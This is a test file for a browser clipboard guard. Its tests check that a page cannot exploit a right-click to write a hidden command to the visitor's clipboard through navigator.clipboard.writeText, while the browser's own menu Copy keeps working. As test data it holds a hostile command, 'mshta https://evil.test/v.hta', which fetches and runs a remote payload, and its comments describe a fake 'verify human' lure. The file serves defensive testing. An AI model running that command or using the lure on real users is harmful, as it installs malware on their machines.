// A right-click (contextmenu) is not a copy. The guard records the selection
// at contextmenu time as a "menu" copy gesture valid for 30 s. The page can set
// that selection itself (selectAllChildren on a hidden node) before the
// visitor right-clicks anything, then call navigator.clipboard.writeText with
// the command: no copy was intended, so the write must be refused. The
// browser's own menu "Copy" (the native copy event) of the selection must
// keep working.
import clipboardSource from "../src/guards/clipboard.js" with { type: "text" };
import { unwrapMain } from "./fixtures/main-source.mjs";
function assert(c, l) { if (!c) throw new Error(l); }
const loadClip = () => { const api = {}; new Function(`${unwrapMain(clipboardSource)}\nreturn installClipboardGuard;`)()(api); return api; };
const CMD = "mshta https://evil.test/v.hta";

function fakePage(host) {
  const listeners = {};
  const written = [];
  const notices = [];
  let selection = "";
  let t = 1000;
  class Clipboard { writeText(x) { written.push(x); return Promise.resolve(); } }
  const clipboard = new Clipboard();
  class Document { execCommand() { return true; } }
  const document = new Document();
  document.addEventListener = (type, f) => { (listeners[type] ||= []).push(f); };
  document.activeElement = null;
  class DataTransfer { constructor() { this.data = {}; } setData(k, v) { this.data[k] = v; } }
  class Selection { toString() { return selection; } }
  const window = { getSelection: () => new Selection(), Selection, DataTransfer, Document };
  const g = loadClip();
  g.install({ window, document, navigator: { clipboard }, location: { hostname: host }, now: () => t, notify: (id) => notices.push(id), flagOn: () => true });
  return {
    written, notices, clipboard, window,
    select: (s) => { selection = s; },
    tick: (ms) => { t += ms; },
    input: (type, e) => { const ev = Object.assign({ isTrusted: true, prevented: false, preventDefault() { this.prevented = true; } }, e); for (const f of listeners[type] || []) f(ev); return ev; },
  };
}

Deno.test("control: the browser's own context-menu Copy of the selection still goes through", () => {
  const p = fakePage("verify-human.example");
  p.select(CMD);
  p.input("contextmenu", {});
  p.tick(5000);
  // Since 0.3.6 (review 2026-11-16 WP-02) the guard cancels the browser's own
  // copy and writes the checked selection itself.
  const dt = new p.window.DataTransfer();
  const ev = p.input("copy", { clipboardData: dt });
  assert(!ev.prevented || dt.data["text/plain"] === CMD, "menu copy of the selection");
});

Deno.test("a right-click on a page-selected hidden command does not authorise writeText of that command", async () => {
  const p = fakePage("verify-human.example");
  // Page: opacity:0 div holding the command, selected with selectAllChildren.
  p.select(CMD);
  // Visitor: "right-click the checkbox to verify", then dismisses the menu (no Copy chosen).
  p.input("contextmenu", {});
  p.tick(3000);
  let rejected = false;
  await p.clipboard.writeText(CMD).catch((e) => { rejected = e && e.name === "NotAllowedError"; });
  assert(rejected && p.written.length === 0, "writeText after a mere right-click was allowed: " + JSON.stringify({ rejected, written: p.written, notices: p.notices }));
});
